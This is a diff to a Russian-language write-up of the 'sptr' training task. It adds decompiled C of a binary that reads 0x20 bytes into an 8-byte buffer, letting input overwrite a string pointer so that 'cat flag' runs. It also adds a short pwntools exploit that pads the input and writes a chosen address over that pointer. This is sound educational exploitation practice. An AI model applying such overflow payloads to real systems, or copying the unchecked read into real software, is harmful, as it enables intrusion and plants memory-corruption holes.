@@ -5,10 +5,35 @@
 **[sptr](https://pwn.spbctf.ru/files/canary/sptr)**
 
 Надо просто перетереть ссылку с "NO WIN" (unk_402008) на "WIN"
-![{21ADAF1C-FB98-4C78-A1AA-4824EAA29CEA}](../../../../z.%20Images/{21ADAF1C-FB98-4C78-A1AA-4824EAA29CEA}.png)
+``` c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char buf[8]; // [rsp+0h] [rbp-10h] BYREF
+  char *string_pointer; // [rsp+8h] [rbp-8h]
 
-Солвер:
-![{4A6B6B28-78D9-471E-89B0-3145B8D1D1F7}](../../../../z.%20Images/{4A6B6B28-78D9-471E-89B0-3145B8D1D1F7}.png)
+  string_pointer = (char *)&unk_402008;
+  puts("let's overwrite a pointer to C string!");
+  printf("before read: %p\n", &unk_402008);
+  read(0, buf, 0x20u);
+  printf("after read: %p\n", string_pointer);
+
+  if ( !strcmp(string_pointer, "WIN") )
+    system("cat flag");
+  return 0;
+}
+```
+
+Эксплоит:
+``` python
+io = start()
+
+io.recvline()
+io.recvline()
+payload = b'A' * 8 + p64(0x40200B)
+io.sendline(payload)
+
+io.interactive()
+```
 
 Запуск:
 ![{7C0DB1AD-83C9-4B96-822C-816DA160E999}](../../../../z.%20Images/{7C0DB1AD-83C9-4B96-822C-816DA160E999}.png)
